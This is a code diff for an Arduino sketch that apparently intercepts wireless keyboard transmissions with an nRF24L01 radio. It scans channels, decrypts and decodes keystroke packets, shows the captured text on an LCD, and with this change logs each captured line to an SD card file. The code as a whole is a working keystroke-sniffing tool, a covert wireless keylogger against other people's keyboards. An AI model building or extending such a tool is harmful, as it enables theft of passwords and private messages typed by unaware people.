@@ -1,22 +1,25 @@
+#include <avr/pgmspace.h>
 #include <EEPROM.h>
+#include <SD.h>
 #include <SPI.h>
 #include "nRF24L01.h"
 #include "RF24.h"
 
 #define DEBUG
+#define SD_PIN_CS 8
 #define NRF24L01_RADIO_PIN_CE 9
 #define NRF24L01_RADIO_PIN_CSN 10
-#define LCD_PIN_SCE   7 //Pin 3 on LCD
-#define LCD_PIN_RESET 6 //Pin 4 on LCD
-#define LCD_PIN_DC    5 //Pin 5 on LCD
-#define LCD_PIN_SDIN  4 //Pin 6 on LCD
-#define LCD_PIN_SCLK  3 //Pin 7 on LCD
-#define LCD_COMMAND 0 
-#define LCD_DATA  1
+#define LCD_PIN_SCE   7 
+#define LCD_PIN_RESET 6
+#define LCD_PIN_DC    5
+#define LCD_PIN_SDIN  4
+#define LCD_PIN_SCLK  3
 #define LCD_X     84
 #define LCD_Y     48
-#define LCD_CHARACTER_WIDTH 7 // Includes 1 line padding
+#define LCD_CHARACTER_WIDTH 7 // Includes 1 line padding on either side
 #define LCD_CHARACTER_HEIGHT    8
+#define CHARACTER_BUFFER_NUMBER_OF_LINES 6
+#define CHARACTER_BUFFER_NUMBER_OF_CHARACTERS_PER_LINE 12
 #define SERIAL_BAUDRATE 115200
 #define EEPROM_LAST_CHANNEL_VALUE_ADDRESS  0x05 
 #define RADIO_PACKET_SIZE 16
@@ -25,9 +28,8 @@
 #define MODE_READING 3
 #define MODE_STATUS 4
 
-//This table contains the hex values that represent pixels
-//for a font that is 5 pixels wide and 8 pixels high
-static const byte ASCII[][5] = {
+//This table contains the hex values that represent pixels for a font that is 5 pixels wide and 8 pixels high
+static const byte ASCII[][5] PROGMEM = {
   {0x00, 0x00, 0x00, 0x00, 0x00} // 20  
   ,{0x00, 0x00, 0x5f, 0x00, 0x00} // 21 !
   ,{0x00, 0x07, 0x00, 0x07, 0x00} // 22 "
@@ -246,18 +248,20 @@ uint16_t nrf24l01_last_packet_sequence = 0;
 uint16_t nrf24l01_last_letter_received = 0;
 boolean nrf24l01_last_keytroke_was_on_single_line = false;
 
-char lcd_display_character_buffer[6][12];
+char lcd_display_character_buffer[CHARACTER_BUFFER_NUMBER_OF_LINES][CHARACTER_BUFFER_NUMBER_OF_CHARACTERS_PER_LINE];
 uint8_t lcd_display_character_buffer_current_line = 1;
-uint8_t lcd_display_character_buffer_character_position = 1;
+uint8_t lcd_display_character_buffer_current_character_position = 1;
+
+File sd_card_text_file;
 
 uint8_t decode_hid_data(uint8_t hid, uint8_t meta)
 {
-   if(hid >= sizeof(HID_basic)/2)
-      return('_');
+  if(hid >= sizeof(HID_basic)/2)
+    return('_');
 
-   /* return ASCII char - if the shift metakey is also pressed, there is one bit set in the metakey info byte. */
-   meta &= 0x22;
-   return(HID_basic[hid][(meta>>5)||(meta>>1)]);
+  /* return ASCII char - if the shift metakey is also pressed, there is one bit set in the metakey info byte. */
+  meta &= 0x22;
+  return(HID_basic[hid][(meta>>5)||(meta>>1)]);
 }
 
 void nrf24l01_decrypt_packet(uint8_t* p)
@@ -279,9 +283,10 @@ void nrf24l01_process_packet(uint8_t* packet)
   }
   
   if(packet[0] != 0x0A) return; 
-  if(packet[9] == 0) return;
+  if(packet[9] == 0) return; // If there is no key value then ignore it.
   if(packet[1] != 0x78) return;
   
+  // If this is a duplicate packet with the same last sequence value then ignore it.
   uint16_t sequence = (packet[5] << 8) + packet[4];
   if (sequence == nrf24l01_last_packet_sequence) return;
   
@@ -297,24 +302,32 @@ void nrf24l01_process_packet(uint8_t* packet)
   uint16_t current_letter_position_three = (current_meta_value << 8) + current_key_position_three;
   boolean current_key_is_on_single_line = current_key_position_two == 0 && current_key_position_three == 0;
   
+  // If a person holds the keys down then the same key will be sent in multiple packets and need to be ignored.
+  // e.g. If someone starts typing D then presses a: packet one will have |D| | |, and packet two will have |D|a| | etc.
+  
+  // If the 3rd character sent is not the same as the last received letter then it is a valid character.
   if(current_key_position_three != 0 && current_letter_position_three != nrf24l01_last_letter_received)
   {
     position_three_contains_valid_letter = true;
   }
   
+  // If the 2nd character sent is not the same as the last received letter then it is a valid character. 
   if(current_key_position_two != 0 && current_letter_position_two != nrf24l01_last_letter_received)
   {
     position_two_contains_valid_letter = true;
   }
   
-  if(current_key_position_two == 0 || position_two_contains_valid_letter == true) // only pay attention if the character ahead in position two was not ignored
+  // Only pay attention if the character ahead in position two was not ignored.
+  if(current_key_position_two == 0 || position_two_contains_valid_letter == true) 
   {
+    // If the character sent is different OR if this packet and the last packet sent only one character at a time (this will happen if a key is pressed twice in a row)
     if(current_letter_position_one != nrf24l01_last_letter_received || (nrf24l01_last_keytroke_was_on_single_line == true && current_key_is_on_single_line == true))
     {
       position_one_contains_valid_letter = true;
     }
   }
   
+  // The letters need to be processed in lineal order.
   if(position_one_contains_valid_letter == true) process_letter(current_meta_value, current_key_position_one);
   if(position_two_contains_valid_letter == true) process_letter(current_meta_value, current_key_position_two);
   if(position_three_contains_valid_letter == true) process_letter(current_meta_value, current_key_position_three);
@@ -343,12 +356,18 @@ void process_letter(char meta_value, char key)
   Serial.print(")");
   #endif
   
-  if(lcd_display_character_buffer_character_position == sizeof(lcd_display_character_buffer[0]))
+  // If we have reached the end of the current line then save the line to the SD card.
+  if(lcd_display_character_buffer_current_character_position == CHARACTER_BUFFER_NUMBER_OF_CHARACTERS_PER_LINE)
   {
-    if(lcd_display_character_buffer_current_line == sizeof(lcd_display_character_buffer))
+    save_current_line_to_sd_card();
+    // If we are on the last line then shift all lines up by one
+    if(lcd_display_character_buffer_current_line == CHARACTER_BUFFER_NUMBER_OF_LINES)
     {
-      for(int i=0; i < sizeof(lcd_display_character_buffer) - 1; i++) strcpy(lcd_display_character_buffer[i], lcd_display_character_buffer[i + 1]); 
-      strcpy(lcd_display_character_buffer[sizeof(lcd_display_character_buffer) - 1], "            ");
+      for(int i = 0; i < CHARACTER_BUFFER_NUMBER_OF_LINES - 1; i++)
+      {
+         strcpy(lcd_display_character_buffer[i], lcd_display_character_buffer[i + 1]); 
+      }
+      strcpy(lcd_display_character_buffer[CHARACTER_BUFFER_NUMBER_OF_LINES - 1], "            ");
       redraw_all_buffered_characters_to_screen();
     }
     else
@@ -356,16 +375,46 @@ void process_letter(char meta_value, char key)
       lcd_display_character_buffer_current_line++;
     }
     
-    lcd_display_character_buffer_character_position = 1;
+    lcd_display_character_buffer_current_character_position = 1;
   }
   
-  lcd_display_character_buffer[lcd_display_character_buffer_current_line - 1][lcd_display_character_buffer_character_position - 1] = letter;
+  // Update the character in the buffer.
+  lcd_display_character_buffer[lcd_display_character_buffer_current_line - 1][lcd_display_character_buffer_current_character_position - 1] = letter;
+  
   if(mode == MODE_READING)
   {
-    lcd_go_to_x_y((lcd_display_character_buffer_character_position - 1) * LCD_CHARACTER_WIDTH, lcd_display_character_buffer_current_line - 1);
+    // Add the character to the lcd display
+    lcd_go_to_x_y((lcd_display_character_buffer_current_character_position - 1) * LCD_CHARACTER_WIDTH, lcd_display_character_buffer_current_line - 1);
     lcd_print_character(letter);
   }
-  lcd_display_character_buffer_character_position++;
+  
+  lcd_display_character_buffer_current_character_position++;
+}
+
+void save_current_line_to_sd_card()
+{
+  sd_card_text_file = SD.open("ms_kb_reader.txt", FILE_WRITE);
+  #ifdef DEBUG
+  if (!sd_card_text_file) 
+  {
+    Serial.println(F("Failed to open SD."));
+  }
+  else
+  {
+    Serial.println(F("Saving line to SD card: "));    
+  }
+  #endif
+  for(int i = 0; i < CHARACTER_BUFFER_NUMBER_OF_CHARACTERS_PER_LINE; i++) 
+  {
+    char character_to_save = lcd_display_character_buffer[lcd_display_character_buffer_current_line - 1][i];
+    if (sd_card_text_file) {
+      sd_card_text_file.print(character_to_save);
+      #ifdef DEBUG
+      Serial.println(character_to_save);
+      #endif
+    }
+  }
+  sd_card_text_file.close();
 }
 
 void display_scanning_channel_on_lcd()
@@ -409,16 +458,16 @@ void display_setup_status_screen_static_text()
 
 void redraw_all_buffered_characters_to_screen()
 {
-	lcd_clear_screen();
-    for(int row = 0; row < sizeof(lcd_display_character_buffer); row++)
+  lcd_clear_screen();
+  for(int row = 0; row < CHARACTER_BUFFER_NUMBER_OF_LINES; row++)
+  {
+    for(int column = 0; column < CHARACTER_BUFFER_NUMBER_OF_CHARACTERS_PER_LINE; column++)
     {
-      for(int column = 0; column < sizeof(lcd_display_character_buffer[0]); column++)
-      {
-        char letter = lcd_display_character_buffer[row][column];
-        lcd_go_to_x_y(column * LCD_CHARACTER_WIDTH, row);
-        lcd_print_character(letter);
+      char letter = lcd_display_character_buffer[row][column];
+      lcd_go_to_x_y(column * LCD_CHARACTER_WIDTH, row);
+      lcd_print_character(letter);
       }
-    }
+  }
 }
 
 uint8_t nrf24l01_flush_rx(void)
@@ -470,7 +519,10 @@ void scan_for_keyboards()
   while (1)
   {
     if (nrf24l01_channel > 80)
+    {
       nrf24l01_channel = 3;
+    }
+      
     #ifdef DEBUG
     Serial.println("");
     Serial.print(F("Scanning channel "));
@@ -576,12 +628,23 @@ void display_introduction_on_lcd()
   }
 }
 
+void sd_initialize()
+{
+  if (!SD.begin(SD_PIN_CS)) {
+    #ifdef DEBUG
+    Serial.println(F("SD card initialization failed."));
+    #endif
+  }
+}
+
 void setup()
 {
   Serial.begin(SERIAL_BAUDRATE);
+  sd_initialize();
   lcd_inititialize();
   nrf24l01_initialize();
-  //attachInterrupt(1, mode_button_pressed_isr, FALLING);
+  digitalWrite(2, HIGH); 
+  attachInterrupt(0, mode_button_pressed_isr, FALLING);
   display_introduction_on_lcd();
   scan_for_keyboards();
   nrf24l01_setup_for_reading_keyboard();
@@ -623,14 +686,14 @@ void loop(void)
 }
 
 void lcd_go_to_x_y(int x, int y) {
-  lcd_send_data(0, 0x80 | x);  // Column.
-  lcd_send_data(0, 0x40 | y);  // Row.  ?
+  lcd_send_command(0x80 | x);  // Column.
+  lcd_send_command(0x40 | y);  // Row.
 }
 
 //This takes a large array of bits and sends them to the LCD
 void lcd_bitmap(char my_array[]){
   for (int index = 0 ; index < (LCD_X * LCD_Y / 8) ; index++)
-    lcd_send_data(LCD_DATA, my_array[index]);
+    lcd_send_data(my_array[index]);
 }
 
 //This function takes in a character, looks it up in the font table/array
@@ -640,13 +703,13 @@ void lcd_bitmap(char my_array[]){
 void lcd_print_character(char character) {
   if(character < 0x20 || character > 0x7f) character = 0x3f;
   
-  lcd_send_data(LCD_DATA, 0x00); //Blank vertical line padding
+  lcd_send_data(0x00); //Blank vertical line padding
 
   for (int index = 0 ; index < 5 ; index++)
-    lcd_send_data(LCD_DATA, ASCII[character - 0x20][index]);
+    lcd_send_data(pgm_read_byte(&ASCII[character - 0x20][index]));
     //0x20 is the ASCII character for Space (' '). The font table starts with this character
 
-  lcd_send_data(LCD_DATA, 0x00); //Blank vertical line padding
+  lcd_send_data(0x00); //Blank vertical line padding
 }
 
 //Given a string of characters, one by one is passed to the LCD
@@ -677,14 +740,13 @@ void lcd_print_string(String string)
 //Clears the LCD by writing zeros to the entire screen
 void lcd_clear_screen(void) {
   for (int index = 0 ; index < (LCD_X * LCD_Y / 8) ; index++)
-    lcd_send_data(LCD_DATA, 0x00);
+    lcd_send_data(0x00);
     
   lcd_go_to_x_y(0, 0); //After we clear the display, return to the home position
 }
 
 //This sends the magical commands to the PCD8544
 void lcd_inititialize(void) {
-
   //Configure control pins
   pinMode(LCD_PIN_SCE, OUTPUT);
   pinMode(LCD_PIN_RESET, OUTPUT);
@@ -696,22 +758,24 @@ void lcd_inititialize(void) {
   digitalWrite(LCD_PIN_RESET, LOW);
   digitalWrite(LCD_PIN_RESET, HIGH);
 
-  lcd_send_data(LCD_COMMAND, 0x21); //Tell LCD that extended commands follow
-  lcd_send_data(LCD_COMMAND, 0xB0); //Set LCD Vop (Contrast): Try 0xB1(good @ 3.3V) or 0xBF if your display is too dark
-  lcd_send_data(LCD_COMMAND, 0x04); //Set Temp coefficent
-  lcd_send_data(LCD_COMMAND, 0x14); //LCD bias mode 1:48: Try 0x13 or 0x14
+  lcd_send_command(0x21); //Tell LCD that extended commands follow
+  lcd_send_command(0xB0); //Set LCD Vop (Contrast): Try 0xB1(good @ 3.3V) or 0xBF if your display is too dark
+  lcd_send_command(0x04); //Set Temp coefficent
+  lcd_send_command(0x14); //LCD bias mode 1:48: Try 0x13 or 0x14
 
-  lcd_send_data(LCD_COMMAND, 0x20); //We must send 0x20 before modifying the display control mode
-  lcd_send_data(LCD_COMMAND, 0x0C); //Set display control, normal mode. 0x0D for inverse
+  lcd_send_command(0x20); //We must send 0x20 before modifying the display control mode
+  lcd_send_command(0x0C); //Set display control, normal mode. 0x0D for inverse
 }
 
-//There are two memory banks in the LCD, data/RAM and commands. This 
-//function sets the DC pin high or low depending, and then sends
-//the data byte
-void lcd_send_data(byte data_or_command, byte data) {
-  digitalWrite(LCD_PIN_DC, data_or_command); //Tell the LCD that we are writing either to data or a command
-  
-  //Send the data
+void lcd_send_data(byte data) {
+  digitalWrite(LCD_PIN_DC, HIGH); 
+  digitalWrite(LCD_PIN_SCE, LOW);
+  shiftOut(LCD_PIN_SDIN, LCD_PIN_SCLK, MSBFIRST, data);
+  digitalWrite(LCD_PIN_SCE, HIGH);
+}
+
+void lcd_send_command(byte data) {
+  digitalWrite(LCD_PIN_DC, LOW); 
   digitalWrite(LCD_PIN_SCE, LOW);
   shiftOut(LCD_PIN_SDIN, LCD_PIN_SCLK, MSBFIRST, data);
   digitalWrite(LCD_PIN_SCE, HIGH);
